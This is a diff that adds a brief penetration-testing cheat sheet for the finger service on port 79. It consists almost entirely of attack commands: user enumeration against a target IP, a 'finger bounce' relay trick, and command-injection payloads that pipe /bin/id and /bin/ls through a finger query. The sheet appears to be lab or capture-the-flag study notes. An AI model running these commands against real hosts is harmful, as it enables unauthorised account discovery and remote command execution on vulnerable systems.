@@ -1,0 +1,25 @@
+User enumeration
+
+finger @<IP>
+finger <USER>@<IP>
+
+Command execution
+
+finger "|/bin/id@<IP>"
+finger "|/bin/ls -a /<IP>"
+
+
+finger(79)
+    - list all users
+        > finger @10.10.10.76
+    - Other finger commands to exploit system
+        > finger user@10.10.10.76
+        > finger 0@target.host
+        > finger .@target.host
+        > finger **@target.host
+        > finger user@target.host
+        > finger test@target.host
+    - finger bounce
+        > finger@finger-server-ip@yourip
+    - injection
+        > finger "|/bin/id@10.10.10.76"
